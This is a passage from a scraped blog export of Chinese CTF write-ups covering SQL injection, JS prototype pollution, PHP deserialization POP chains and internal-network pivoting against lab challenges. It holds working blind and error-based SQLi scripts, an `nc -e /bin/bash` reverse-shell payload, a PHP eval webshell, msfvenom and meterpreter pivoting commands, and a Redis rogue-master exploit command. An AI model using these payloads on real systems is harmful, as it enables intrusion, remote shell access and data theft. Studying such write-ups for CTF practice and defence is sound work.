将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似\n[极客大挑战 2019]FinalSQL 考点：bool盲注，1^(condition)^1绕过or被滤，嵌套()绕过空格被过滤\n相比于这个比赛的其他sqli，这道题多了id=的查询页面，并且提示了是MySQL盲注\n起初发现了username位置可以用反斜杠逃逸，不过因为所有的注释方法都被过滤了，就没有什么用\nfuzz，常规的单引号，空格，注释，or，|，\u0026都被过滤了。\n随便点一个数字，发现是不用注释的数值型注入（嘿嘿嘿）\nor被过滤，使用1^(condition)来绕过：\n?id=0\r//返回ERROR\r?id=0^1\r//返回NO! Not this! Click others~~~\r那么我们注入成功了，不过要把(condition)换成其他查询语句还需要在末尾再添一个^1（我也不知道怎么回事儿）\n?id=1^((length(database()))\u003e1)^1\r//返回NO! Not this! Click others~~~\r?id=1^((length(database()))\u003e99)^1\r//返回ERROR！！！\r那么我们可以轻松地区别出bool真假页面返回信息不同\n话不多说，直接上exp：\n#by wh1sper\r#bool盲注\rimport requests\rhost = 'http://368375df-ca56-4f5d-8cd4-ab07fb575003.node3.buuoj.cn/search.php?id='\rdef mid(bot, top):\rreturn (int)(0.5*(top + bot))\rdef sqli():\rname = ''\rfor j in range(1, 250):\rtop = 126\rbot = 32\rwhile 1:\r#select = '(ascii(substr(database(),{},1)))\u003e{}'.format(j, mid(top, bot))#---\u003egeek\r#查库名\r#select = \"(ascii(substr((select(group_concat(table_name))\r# from(information_schema.tables)where(table_schema='geek')),{},1)))\u003e{}\"\r# .format(j, mid(top, bot))#---\u003eF1naI1y,Flaaaaag\r#查表名\r#select = \"(ascii(substr((select(group_concat(column_name))\r# from(information_schema.columns)where(table_name='Flaaaaag')),{},1)))\u003e{}\"\r# .format(j, mid(top, bot))#---\u003eid,fl4gawsl\r#查列名\rselect = \"(ascii(substr((select(group_concat(password))\" \\\r\"from(F1naI1y)),{},1))\u003e{})\".format(j, mid(top, bot))\rplayload = \"1^(\"+select+\")^1\"\r#print(playload)\rr = requests.get(url=host+playload)\r#print(r.text)\rif 'NO!' in r.text: # 成功\rif top - 1 == bot: # top和bot相邻，说明name是top\rname += chr(top)\rprint(name)\rbreak\rbot = mid(bot, top) # 成功就上移bot\relse: # 失败\rif top - 1 == bot: # top和bot相邻，加上失败，说明name是bot\rname += chr(bot)\rprint(name)\rbreak\rtop = mid(bot, top) # 失败就下移top\rif __name__ == '__main__':\rsqli()\rflag{c0db499e-7c62-46c7-a2ce-0bd9a239cc25}\n[CISCN2019 华北赛区 Day2 Web1]Hack World 考点：SQLi、括号嵌套绕过空格、^符号绕过or\n直接给了表名='flag'，列名='flag'。\nfuzz，常规搞事儿关键字都被过滤；\n想到了前几天做的finalSQLi，尝试用^代替or\n0^1\r//返回Hello, glzjin wants a girlfriend.和1的结果一样，说明起效了\r那么尝试库名：\n0^(length(database())\u003e1)\r//成功\rok，直接写脚本\n需要注意的是substr((condition),1,1)的condition子查询，两边需要括号，不然来不了事儿。\nexp：\n#wh1sper\r#bool盲注\rimport requests\rhost = 'http://14bb7de3-9b94-4870-9178-2fefa1bfc029.node3.buuoj.cn/index.php'\rdef mid(bot, top):\rreturn (int)(0.5*(top + bot))\rdef sqli():\rname = ''\rfor j in range(1, 250):\rtop = 126\rbot = 32\rwhile 1:\r#babyselect = \"database()\"--\u003ectftraining\r#babyselect = \"version()\"--\u003e10.2.26-MariaDB-log\rbabyselect = \"(select(flag)from(ctftraining.flag))\"\rselect = \"ascii(substr(\"+babyselect+\",{},1))\u003e{}\".format(j, mid(top, bot))\rplayload = \"0^(\"+select+\")\"\rdata = {\r\"id\": playload\r}\r#print(playload)\rr = requests.post(url=host, data=data)\r#print(r.text)\rif 'glzjin wants' in r.text: # 成功\rif top - 1 == bot: # top和bot相邻，说明name是top\rname += chr(top)\rprint(name)\rbreak\rbot = mid(bot, top) # 成功就上移bot\relse: # 失败\rif top - 1 == bot: # top和bot相邻，加上失败，说明name是bot\rname += chr(bot)\rprint(name)\rbreak\rtop = mid(bot, top) # 失败就下移top\rif __name__ == '__main__':\rsqli()\rflag{2ed1b2c4-f083-424e-a4e9-303222f99563}\n[GYCTF2020]Ezsqli 考点：bool盲注，绕information_schema和sys.schema_auto_increment_columns，无列名过滤union和join\n本站GYCTFwp已经讲过，所以简单说。\n0||1\r//返回Nu1L\r0||0\r//返回Error Occured When Fetch Result.\r判断为bool盲注；\ninformation_schema和sys.schema_auto_increment_columns这两个都被过滤了，可以使用sys.schema_table_statistics_with_buffer，无列名，而且过滤union和join，就只能用类似于：\n(select 'admin','admin')\u003e(select * from users limit 1)\r这样的语句，前提是两边的查询列数相等，然后是按位比较，在某一位上谁大，那么就是谁大，如果相等的话，就比较下一位。\n举几个例子：\ng \u003e flag{abcd}\ra \u003c flag{abcd}\rfz \u003e flag{bbbbb}//第一位相等，比较第二位\r那么直接exp：\n#wh1sper\r#bool盲注\rimport requests\rhost = 'http://7282ff4f-c5c7-4023-be2e-b40f0e422e2c.node3.buuoj.cn/index.php'\rdef mid(bot, top):\rreturn (int)(0.5*(top + bot))\rdef trans_to_hex(str):\rresult = '0x'\rfor i in str:\rtemp = hex(ord(i))\rresult += temp.replace('0x','')\rreturn result\rdef sqli():\rname = ''\rfor j in range(20, 250):\rtop = 126\rbot = 32\rwhile 1:\r#babyselect = \"(database())\"---\u003egive_grandpa_pa_pa_pa\r#babyselect = \"(version())\"---\u003e10.2.26-MariaDB-log\r#babyselect = \"(select group_concat(table_name) from # sys.schema_table_statistics_with_buffer\r# where table_schema=database())\"---\u003eusers233333333333333,f1ag_1s_h3r3_hhhhh\r#select = \"ascii(substr(\"+babyselect+\",{},1))\u003e{}\".format(j, mid(top, bot))\rselect = \"(select * from f1ag_1s_h3r3_hhhhh)\u003e(select 1,{})\".\\\rformat(trans_to_hex(name+chr(mid(bot, top))))\rplayload = \"0||\"+select\rdata = {\r\"id\": playload\r}\r#print(playload)\rr = requests.post(url=host, data=data)\r#print(r.text)\rif '|' in name://最后一位没有下一位可以比较，只能在这里返回，替换一下即可\rname = name.lower().replace('|', '}')\rprint(name)\rreturn\rif 'Nu1L' in r.text: # 成功\rif top - 1 == bot: # top和bot相邻，说明name是top\rname += chr(top-1)\rprint(name)\rbreak\rbot = mid(bot, top) # 成功就上移bot\relse: # 失败\rif top - 1 == bot: # top和bot相邻，加上失败，说明name是bot\rname += chr(bot)\rprint(name)\rbreak\rtop = mid(bot, top) # 失败就下移top\rif __name__ == '__main__':\rsqli()\r原题flag都是小写，所以就没管它，不过出题人笔记里边本来想考大小写的，我太垃圾，就没管了\nflag{ec726349-d504-4a00-a288-7b72fbc33418}\n[极客大挑战 2019]HardSQL 考点：报错注入\n先是fuzz，引号，注释没被过滤，|、\u0026、空格、*这些都被过滤了\n利用亦或符号进行注入：\nusername=1'^1%23\u0026password=1\r回显：\rLogin Success!!\r应该可以盲注或者报错注入\n我这里用的是报错注入\nimport requests\rimport re\rhost = 'http://7e5bdd7f-60ce-49fc-88cb-cf4e6ac51763.node3.buuoj.cn/check.php?'\r#babystr = \"select(database())\"--\u003egeek\r#babystr = \"select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))\"--\u003eH4rDsq1\r#babystr = \"select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1'))\"--\u003eid,username,password\r#babystr = \"select(left(group_concat(password),31))from(H4rDsq1)\"\rbabystr = \"select(right(group_concat(password),31))from(H4rDsq1)\"\r#--flag{9b788a2b-b307-4935-b7e7-0b'\r#--2b-b307-4935-b7e7-0b853f26382a}\r#flag{9b788a2b-b307-4935-b7e7-0b853f26382a}\rpayload = \"username=1'^updatexml(1,concat(0x7e,({}),0x7e),1)%23\u0026password=1\".format(babystr)\rr = requests.get(host+payload)\rprint(payload)\rprint(r.text)\r注意点是updatexml这个报错注入只能显示32个字符，需要两次用left和right分别打\nflag{9b788a2b-b307-4935-b7e7-0b853f26382a}\n","description":"","tags":["SQLi"],"title":"BUUOJ刷题记录","uri":"/posts/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"categories":["ctf_writeup"],"content":"0x00前言 终于等到来的太突然的考核，感觉自己表现不是太好，本来入门时间也不短了，是因为不够努力才这么菜\n玩了一把内网渗透（不是），感觉有点意思。\n0x01第一题 考点：sqli\n username中\\转义'导致password语句逃逸单引号 union注入 绕过逗号过滤继续注入 无列名注入  打开题目，抓包，发现POST过去的数据是json形式，没想到其他，只想到了sqli，于是我用bp的intruder模块fuzz了一下：\n(这里本来有一个表，莫名其妙消失了)\n被过滤：单引号、|、，、or、空格\n没被过滤：select、union\n空格被过滤，用//代替，（可以使用word的替换功能）本文的空格都是//\n既然单引号被过滤了，那么就想到了CGCTF和之前的BJDCTF的注入，利用username输入反斜杠来转义单引号，直接看例子：\n原本语句：SELECT * from user WHERE username = 'admin' and password = '123'\r转义语句：SELECT * from user WHERE username = 'admin\\' and password =' or 1=1#'\r我们可以看到，实际上第二句的username是'admin\\' and password ='后门接的or 1=1自然也就造成了注入。\n这道题正常输入的时候回显是username or password error如果使用这个playload的话回显是true\nunion没有被过滤的话，那么就尝试union注入吧：\n查询列数：\r{\"username\":\"1\\\\\",\"password\":\"group/**/by/**/1#\"}\r这里有点玄学的是，明明查的是三列，但是只能group by 1有回显，就很神奇。\n查询列数： {\"username\":\"1\\\\\",\"password\":\"union/**/select/**/1,2,3#\"}\r回显是“WAF！！！”因为逗号被过滤了\n利用join绕过逗号过滤：\nunion select * from ((select 1)A join (select 2)B join (select 3)C)#\r//union select * from ((select 1)A join (select 2)B join (select 3)C)#\r查询成功，列数为3，2和3分别为username和password的回显位置，就可以替换为子查询，但是最致命的是or被过滤了，造成了information_schema背锅，所以我们需要bypass information_schema\n查看了MySQL版本为5.7之后sys.schema_auto_increment_columns成为了我们的工具\n将上述语句的2或3替换为：\nSELECT group_concat(table_name) from sys.schema_auto_increment_columns WHERE table_schema = database()\r表名：user\n本来列名可以猜解出来，不过因为是非预期所以被ban了，接下来便是无列名注入\n替换select 3为\nselect i.3 from (select * from ((select 1)A join (select 2)B join (select 3)C) union select * from users)i limit 1\r回显：{\"code\":2,\"username\":\"2\",\"password\":\"3\",\"result\":\"SUCCESS\"}\n说明和没替换的效果一样，这个道理相当于是利用union查询的特性给他起了一个名字，起的名字是i，i.3就是查第三列，看例子：\nmysql\u003e select * from (select 1,2,3 union select 'a','b','c')i;\r+---+---+---+\r| 1 | 2 | 3 |\r+---+---+---+\r| 1 | 2 | 3 |\r| a | b | c |\r+---+---+---+\rmysql\u003e select i.3 from (select 1,2,3 union select 'a','b','c')i;\r+---+\r| 3 |\r+---+\r| 3 |\r| c |\r+---+\rlmit 1`是和`limit 0,1`效果一样，意思是从第0条返回1条结果，我们这样只能查到我们自己起的列名，想要查值就需要`limit 1，1`但是逗号被过滤了，我们可以用`limit 1 offset 1\rselect 3 替换为：\nselect i.1 from (select * from ((select 1)A join (select 2)B join (select 3)C) union select * from users)i limit 1 offset 1\r查询username列，password列替换为i.2，i.3即可\n最终playload：\nusername: 1\\\\\npassword:\nunion select * from(\r(select 1)A join (select 2)B join(\rselect i.3 from(\rselect * from (\r(select 1)A join (select 2)B join (select 3)C\r)union select * from users\r)i limit 1 offset 1\r)C\r)#\r回显：\n{\"code\":2,\"username\":\"2\",\"password\":\"74b87337454200d4d33f80c4663dc5e5\",\"result\":\"SUCCESS\"}\n0x02第二题 考点：JS原型链污染、MySQL远程登录任意文件读取\n给了index.js源码：\nvar express = require('express');\rvar router = express.Router();\rvar mysql = require('mysql');\rconst isObject = obj =\u003e obj \u0026\u0026 obj.constructor \u0026\u0026 obj.constructor === Object;\rfunction merge(a, b) {\rfor (let attr in b) {\rif (isObject(a[attr]) \u0026\u0026 isObject(b[attr])) {\rmerge(a[attr], b[attr]);\r} else {\ra[attr] = b[attr];\r}\r}\rreturn a\r}\rfunction waf(value){\rlet re = /(,| |or|\\||\\^|\u0026|;|BENCHMARK|SLEEP)/ig;\rlet arr = value.match(re);\rif (arr === null){\rreturn 0;\r}\rreturn 1;\r}\rfunction clone(a) {\rreturn merge({}, a);\r}\rrouter.post('/', function(req, res, next) {\rlet body = JSON.parse(JSON.stringify(req.body));\rif (body.host != undefined) {\rres.json({\r\"result\":\"There is more to it!\"\r});\r}else if (body.username === undefined || body.password === undefined){\rres.json({\r\"code\":1,\r\"result\":\"username and password are necessary!\"\r});\r}else if (waf(body.username)||waf(body.password)){\rres.json({\r\"code\":1,\r\"result\":\"WAF!!!\"\r});\r}else {\rlet copybody = clone(body);\rlet host = copybody.host == undefined ? \"localhost\" : copybody.host\rlet config = {\rhost: host,\ruser: 'root',\rpassword: '123456',\rdatabase: 'security'\r};\rlet connection = mysql.createConnection(config);\rconnection.connect();\rconnection.query('select * from users where uuuusername=\"'+copybody.username+'\" and ppppassword = \"'+copybody.password+'\"', function (error, results, fields) {\rif (error){\rres.json({\r\"code\":1,\r\"result\":\"ERROR\"\r});\r}else if (results[0] === undefined){\rres.json({\r\"code\":1,\r\"result\":\"username or password error\"\r});\r}else{\rres.json({\r\"code\":2,\r\"username\":results[0].uuuusername,\r\"password\":results[0].ppppassword,\r\"result\":\"SUCCESS\"\r});\r}\r});\rconnection.end();\r}\r});\rmodule.exports = router;\r先来说一说JS原型链污染：\n先贴一篇学习链接：\u003e\u003e戳这里\n简单来讲，JS的语言特性是“万物皆为对象（object.prototype）”，这也是JS“基于对象”的解释\n 在javascript中一切皆对象，因为所有的变量，函数，数组，对象 都始于object的原型即object.prototype。同时，在js中只有类才有prototype属性，而对象却没有，对象有的是__proto__和类的prototype对应  如果我们访问一个对象里面属性，JS则会在这个对象里面查找这个属性，如果不存在，那么就会返回上一级查找。\n那么原型链污染就是：\n在我们想要利用的代码之前的赋值语句如果可控的话，我们进行 ——proto 赋值，之后就可以利用代码了\n很明显，这道题我们可以污染host属性\n{\"username\":\"admin\",\"password\":\"1\",\"__proto__\":{\"host\":\"我的ip\"}}\r这里为什么要污染host属性呢，其实是为了触发下一个漏洞——Mysql任意文件读取漏洞。\n直接上exp：Rogue-MySql-Server-master\n修改对应端口就行。\n0x03第三题 考点：\n parse_url解析漏洞、PHP协议容错性、简单sqli、file_put_contents漏洞 简单内网渗透、redis未授权访问漏洞、redis主从复制漏洞  打开题目即送源码：\n\u003c?php\r//it may help u\recho \"\u003ch1\u003eWELCOME 23333333333\u003c/h1\u003e\".\"\\n\";\r$url = $_SERVER[\"HTTP_REFERER\"];\r$r = parse_url($url);\rif(!empty($r['host']) \u0026\u0026 $r['host'] === 'localhost'){\rreadfile($url);// hint.txt\r}\relse{\recho 'ONLY FROM LOCALHOST!!!!'.\"\u003cbr\u003e\";\r}\r//only admin can do it\r$password = $_GET['password'];\r$username = $_GET['username'];\r$content = addslashes($_GET['content']);\rif($username === \"******\" \u0026\u0026 $password === \"******\"){\recho 'now_you_are_admin'.\"\u003cbr\u003e\";\r$sandbox = './sandbox/' . md5(\"x\" . $_SERVER['REMOTE_ADDR']);\r@mkdir($sandbox);\r@chdir($sandbox);\recho $sandbox.\"\u003cbr\u003e\";\rif(!file_exists(\"admin.php\")){\rfile_put_contents('admin.php', \"\u003c?php \\$secret = 'xxx'; ?\u003e\");\r}\r//change the content\rif($content){\r$file = file_get_contents(\"./admin.php\");\r$file = preg_replace(\"/secret = '.*'/\", \"secret = '{$content}'\", $file);\rfile_put_contents('./admin.php', $file);\r}\r}\r第5行parse_url解析我们只需要任意\u003c字母、数字\u003e://\u003c字母、数字\u003e就可以让他返回host=第二个\u003c字母、数字\u003e\n PHP协议的容错性：PHP在遇到一个不认识的协议的时候，会抛出一个warning，并且将协议设置为null。后面，在协议是null或者是file时，会进行本地文件操作。也就是说，默认情况下，如果你没加协议，或者加了个不存在的协议，或者协议名字是file，都会被认为是本地文件的相关操作  playload：\nreferer: 0://localhost/../../../（一个一个加，直到读到文件为止）../hint.txt\r回显告诉了username是pig_can_fly并且说password需要在另一台服务器上面获取，我们点击访问他给的ip，发现就是一个很简单的union注入，得到了password的md5值：dc3565645d8002becb5fd7977aeef3e1\n暴力破解之后是：admin_password\nGET传过去之后出现了一段JS代码，不过我没做（233333）\ncontent变量那里可以直接利用file_put_contents漏洞RCE\nplayload（GET传值）：\n?username=pig_can_fly\u0026password=admin_password\u0026content=a\\';echo+`nc+-e+/bin/bash+我的ip+端口`//\r我之前试了很多个，不知道究竟是哪个起了作用，后来问了问其他人，好像只有反引号才能起作用。\n回到VPS监听端口，果然收到了一份新鲜的shell；\n赶紧重新写一个后门：\necho \"\u003c?php @eval(\\$_POST['123']);?\u003e\" \u003e wh1sper.php\r蚁剑连接，拿到shell；\n高兴了好一阵，不过并没有找到flag，问了出题人，说是在内网。。。\n联想到NCTF2019的true xml cookbook，读取/etc/hosts文件和/proc/net/arp，推测内网存活主机10.0.0.1-3，2是自己，flag可能在3上面。\n于是在VPS上面装了MSF，通过msf的一些模块探测到了一些信息。\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\u003cYour IP Address\u003e LPORT=\u003cYour Port to Connect On\u003e -f elf \u003e shell.elf\r在本地生成了shell.elf文件通过蚁剑上传到目录，继续在msf里面执行：\nuse exploit/multi/handler\rset payloads linux/x86/meterpreter/reverset_tcp\rset lhost 我的ip\rset lport 我的端口\rrun\r执行了这些命令，发现msf开始监听端口，这个时候通过蚁剑终端运行./shell.elf命令，就可以获得一个meterpreter类型的shell\n得到shell之后，我们需要先建立meterpreter基本隧道代理\nmeterpreter基本隧道代理 \u003e\u003e学习连接\n1.portfwd portfwd 是meterpreter提供的一种基本的端口转发。porfwd可以反弹单个端口到本地，并且监听.使用方法如下:\nmeterpreter \u003e portfwd 0 total local port forwards.\rmeterpreter \u003e portfwd -h\rUsage: portfwd [-h] [add | delete | list | flush] [args]\rOPTIONS:\r-L \u003copt\u003e The local host to listen on (optional).\r-h Help banner.\r-l \u003copt\u003e The local port to listen on.\r-p \u003copt\u003e The remote port to connect to.\r-r \u003copt\u003e The remote host to connect to.\r使用实例介绍：\n反弹10.1.1.129端口3389到本地2222并监听那么可以使用如下方法：\nmeterpreter \u003e portfwd add -l 2222 -r 10.1.1.129 -p 3389\r[*] Local TCP relay created: 0.0.0.0:2222 \u003c-\u003e 10.1.1.129:3389\rmeterpreter \u003e portfwd 0: 0.0.0.0:2222 -\u003e 10.1.1.129:3389\r1 total local port forwards.\r2. pivot pivot是meterpreter最常用的一种代理，可以轻松把你的机器代理到受害者内网环境，下面介绍下pivot的搭建和使用方法\n使用方法route add 目标ip或ip段 子网掩码 session序号\n要使用代理的会话，通过实例来说明：\n在metasploit添加一个路由表，目的是访问10.1.1.129将通过meterpreter的会话 1 来访问：\nmsf exploit(handler) \u003e route add 10.1.1.129 255.255.255.255 1\r[*] Route added\rmsf exploit(handler) \u003e route print Active Routing Table\r====================\rSubnet Netmask Gateway\r------ ------- -------\r10.1.1.129 255.255.255.255 Session 1\r这里如果要代理10.1.1.129/24 到session 1，则可以这么写：\nroute add 10.1.1.0 255.255.255.0 1\r到这里pivot已经配置好了，你在msf里对10.1.1.129进行扫描(db_nmap)或者访问(psexe 模块，ssh模块等)将通过代理session 1这个会话来访问。\n但是如果想通过其他应用程序来使用这个代理怎么办呢？\n这时候可以借助 metasploit socks4a提供一个监听隧道供其他应用程序访问：\n首先使用 socks4a并且配置，监听端口：\nmsf exploit(handler) \u003e use auxiliary/server/socks4a msf auxiliary(socks4a) \u003e show options Module options (auxiliary/server/socks4a):\rName Current Setting Required Description\r---- --------------- -------- -----------\rSRVHOST 0.0.0.0 yes The address to listen on\rSRVPORT 1080 yes The port to listen on.\rAuxiliary action:\rName Description\r---- -----------\rProxy msf auxiliary(socks4a) \u003e exploit -y\r[*] Auxiliary module execution completed\rmsf auxiliary(socks4a) \u003e [*] Starting the socks4a proxy server\r查看监听端口：\nroot@kali:~# netstat -an | grep \"1080\"\rtcp 0 0 0.0.0.0:1080 0.0.0.0:* LISTEN\r端口已经监听，接着配置 proxychains\nroot@kali:~# vim /etc/proxychains.conf\r[ProxyList]\r# add proxy here ...\r# meanwileroot@kali:~# netstat -an | grep \"1080\"\rtcp 0 0 0.0.0.0:1080 0.0.0.0:* LISTEN # defaults set to \"tor\"\rsocks4 127.0.0.1 1080\r完成之后我们在命令前面加上proxychain就可以正常的用本机的工具扫描内网了\n至于高端的二级代理甚至多级代理就不谈了。\n这里我只进行了第一步，用了msf里面的portscan扫描了内网10.0.0.3主机的端口，发现只有6379端口开放，网上查阅资料后得知是redis的端口，于是我用了msf里面的几个模块进行了尝试，其中，使用redis_login（用于爆破登录密码）的时候，msf提示我这个端口并没有设置密码，也就是存在redis未授权访问漏洞\n于是我把6379端口映射到了本地的10086，通过本地的redis客户端进行了访问\nredis-cli -h 127.0.0.1 -p 10086\r127.0.0.1:10086\u003e\r127.0.0.1:10086\u003ekeys *\r1) \"welcome\"\r127.0.0.1:10086\u003e\r成功了！！！一阵狂喜过后写了几个键，装了个B，开始尝试利用漏洞。\n\u003e\u003eredis漏洞深度利用\n一般来讲，网上的几种方法：\n(1).利用计划任务执行命令反弹shell\r(2).写ssh-keygen公钥然后使用私钥登陆\r(3).往web物理路径写webshell\r但是我们需要注意的是，(1)需要/var/spool/cron/路径存在并且有权限，(2)需要22端口开放，(3)需要80端口开放并且启动了web服务。\n显然学长没给弹shell的机会，/var/spool/cron/目录根本不存在其他两个端口都没开就不谈了。。。\n不过有趣的是，我利用了redis的config set dir /flag摸清楚了flag在根目录，不过没有找到什么姿势可以让redis直接读取系统文件的。\n后来看到了redis的一个主从机制，也没有往那方面想，于是本题宣告白给。\nwakawaka师傅（最nb的男人）用redis的主从复制漏洞搞了一发，没成功，问学长说是环境问题，给通过了。\nWP在这里就结束了，redis的主从复制漏洞改日在本地复现之后再更。\n更新：\n原理可以百度，这里直接本地用Github上面的redis-rogue-getshell-master打通，本地的exp打docker:（本地不需要redis客户端）\npython3 redis-master.py -r 目标ip -p 目标端口 -L 本机ip -P 本机端口 -f 使用的exp -c 要执行的命令\r","description":"X1cT34m入队考核","tags":["无列名","内网","NodeJS"],"title":"2020 X1cT34m Web第一次考核","uri":"/posts/2020-x1ct34m-web%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%80%83%E6%A0%B8/"},{"categories":["note"],"content":"复现地址：BUUOJ\n打开题目即送源码：MRCTF_ezpop\n先说PHP的一些魔术方法：\n__wakeup() //使用unserialize时触发\r__sleep() //使用serialize时触发\r__destruct() //对象被销毁时触发\r__call() //在对象上下文中调用不可访问的方法时触发\r__callStatic() //在静态上下文中调用不可访问的方法时触发\r__get() //用于从不可访问（或不存在）的属性读取数据\r__set() //用于将数据写入不可访问的属性\r__isset() //在不可访问的属性上调用isset()或empty()触发\r__unset() //在不可访问的属性上使用unset()时触发\r__toString() //把类当作字符串使用时触发\r__invoke() //当尝试将对象调用为函数时触发\r有了这些知识后，我们再来分析源码；\nWelcome to index.php\r\u003c?php\r//flag is in flag.php\r//WTF IS THIS?\r//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5\r%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\r//And Crack It!\rclass Modifier {\rprotected $var;\rpublic function append($value){\rinclude($value);\r}\rpublic function __invoke(){\r$this-\u003eappend($this-\u003evar);\r}\r}\rclass Show{\rpublic $source;\rpublic $str;\rpublic function __construct($file='index.php'){\r$this-\u003esource = $file;\recho 'Welcome to '.$this-\u003esource.\"\u003cbr\u003e\";\r}\rpublic function __toString(){\rreturn $this-\u003estr-\u003esource;\r}\rpublic function __wakeup(){\rif(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-\u003esource)) {\recho \"hacker\";\r$this-\u003esource = \"index.php\";\r}\r}\r}\rclass Test{\rpublic $p;\rpublic function __construct(){\r$this-\u003ep = array();\r}\rpublic function __get($key){\r$function = $this-\u003ep;\rreturn $function();\r}\r}\rif(isset($_GET['pop'])){\r@unserialize($_GET['pop']);\r}\relse{\r$a=new Show;\rhighlight_file(__FILE__);\r}\r我们可以看到，在Modifier类里面有一个include函数，可以通过这个包含flag.php\nclass Modifier {\rprotected $var;\rpublic function append($value){\rinclude($value);\r}\rpublic function __invoke(){\r$this-\u003eappend($this-\u003evar);\r}\r}\r当我们尝试将对象调用为函数时，__invoke()就会自动包含 $var\n所以，我们又看到了Test类里面：\nclass Test{\rpublic $p;\rpublic function __construct(){\r$this-\u003ep = array();\r}\rpublic function __get($key){\r$function = $this-\u003ep;\rreturn $function();\r}\r}\r当我们访问Test类里面一个不可见或者不存在的属性时，__get()自动以函数的方式调用$p;\n那么，源码里面那里能够访问一个属性呢？\nShow类：\nclass Show{\rpublic $source;\rpublic $str;\rpublic function __construct($file='index.php'){\r$this-\u003esource = $file;\recho 'Welcome to '.$this-\u003esource.\"\u003cbr\u003e\";\r}\rpublic function __toString(){\rreturn $this-\u003estr-\u003esource;\r}\rpublic function __wakeup(){\rif(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-\u003esource)) {\recho \"hacker\";\r$this-\u003esource = \"index.php\";\r}\r}\r}\r它可以访问自身属性str的成员source\n如果我们把str属性new一个Test，但是Test里面并没有source属性，\n那么我们new的Test就会以函数的方式调用$p那么如果$p又是一个Modifier类，就会自动包含$var指向的页面。\n所以，我们构造的思路是：\n$poc = new Show; $poc-\u003esource = new Show; $poc-\u003esource-\u003estr = new Test; $poc-\u003esource-\u003estr-\u003ep = new Modifier;\rplayload：\n\u003c?php\rclass Modifier {\rprotected $var = 'php://filter/read=convert.base64-encode/resource=flag.php';\rpublic function append($value){\rinclude($value);\r}\rpublic function __invoke(){\r$this-\u003eappend($this-\u003evar);\r}\r}\rclass Show{\rpublic $source;\rpublic $str;\rpublic function __toString(){\rreturn $this-\u003estr-\u003esource;\r}\rpublic function __wakeup(){\rif(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-\u003esource)) {\recho \"hacker\";\r$this-\u003esource = \"index.php\";\r}\r}\r}\rclass Test{\rpublic $p;\rpublic function __get($key){\r$function = $this-\u003ep;\rreturn $function();\r}\r}\r$poc = new Show;\r$poc-\u003esource = new Show;\r$poc-\u003esource-\u003estr = new Test;\r$poc-\u003esource-\u003estr-\u003ep = new Modifier;\recho serialize($poc);\r解释一下：\n$poc-\u003esource = new Show;\r//为什么要new show两次？\r//触发__toString()，source被第一层show当作字符串，于是访问source-\u003estr-\u003esource,也就是Test里面的source(不存在)，触发__get\r$poc-\u003esource-\u003estr = new Test;\r//$poc-\u003esource-\u003estr-\u003esource（Test-\u003esource）不存在，触发__get\r运行脚本，得到：（注意：Modifier类的protect属性注入需要加%00）\nO:4:\"Show\":2:{s:6:\"source\";O:4:\"Show\":2:{s:6:\"source\";N;s:3:\"str\";O:4:\"Test\":1:{s:1:\"p\";O:8:\"Modifier\":1:{s:6:\"%00*%00var\";s:57:\"php://filter/read=convert.base64-encode/resource=flag.php\";}}}s:3:\"str\";N;}\rGET传值即获flag.php\nMRCTF{1892c0f7-3c71-431f-a991-7414ca1ea339}\n","description":"","tags":["PHP反序列化"],"title":"由MRCTF2020学习反序列化POP链","uri":"/posts/%E7%94%B1mrctf2020%E5%AD%A6%E4%B9%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/"},{"categories":["ctf_writeup"],"content":"cgctf不得不说是一个很棒的学习平台，这里有我写的部分wp：\n\\0x00 考点：%00截断（ereg函数的截断漏洞）、数组绕过（ereg函数的另一个漏洞）\n题目直接给源码：\nview-source:\rif (isset ($_GET['nctf'])) {\rif (@ereg (\"^[1-9]+$\", $_GET['nctf']) === FALSE)\recho '必须输入数字才行';\relse if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag);\relse\recho '骚年，继续努力吧啊~';\r}\r 这里ereg有两个漏洞：  ①%00截断及遇到%00则默认为字符串的结束\n②当ntf为数组时它的返回值不是FALSE\n法一：数组绕过\rindex.php?nctf[]=#biubiubiu\r法二：\\x00截断\rindex.php?nctf=1%00%23biubiubiu\rnctf{use_00_to_jieduan}\nphp 反序列化(暂时无法做) 考点：对象包含的引用在序列化时也会被存储\n题目源码：\n\u003c?php\rclass just4fun {\rvar $enter;\rvar $secret;\r}\rif (isset($_GET['pass'])) {\r$pass = $_GET['pass'];\rif(get_magic_quotes_gpc()){\r$pass=stripslashes($pass);\r}\r$o = unserialize($pass);\rif ($o) {\r$o-\u003esecret = \"*\";\rif ($o-\u003esecret === $o-\u003eenter)\recho \"Congratulation! Here is my secret: \".$o-\u003esecret;\relse echo \"Oh no... You can't fool me\";\r}\relse echo \"are you trolling?\";\r?\u003e\r反序列化后，secret会被重新赋值为一个未知的值，但要求enter跟secret的值一致才能拿到flag。\n 对象包含的引用在序列化时也会被存储  编写脚本：\n\u003c?php\rclass just4fun {\rvar $enter;\rvar $secret;\r}\r$a= new just4fun;\r$a-\u003eenter=\u0026$a-\u003esecret;\recho serialize($a);\r?\u003e\r执行得到：\nO:8:\"just4fun\":2:{s:5:\"enter\";N;s:6:\"secret\";R:2;}\rGET传值过去：\nhttp://4.chinalover.sinaapp.com/web25/index.php?pass=O:8:%22just4fun%22:2:{s:5:%22enter%22;N;s:6:%22secret%22;R:2;}\r得到：\nCongratulation! Here is my secret: thisisnctfsecret\r变量覆盖 考点：变量覆盖漏洞\n题目关键部分源码：\n\u003c?php if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") { ?\u003e\r\u003c?php\rextract($_POST);\rif ($pass == $thepassword_123) { ?\u003e\r\u003cdiv class=\"alert alert-success\"\u003e\r\u003ccode\u003e\u003c?php echo $theflag; 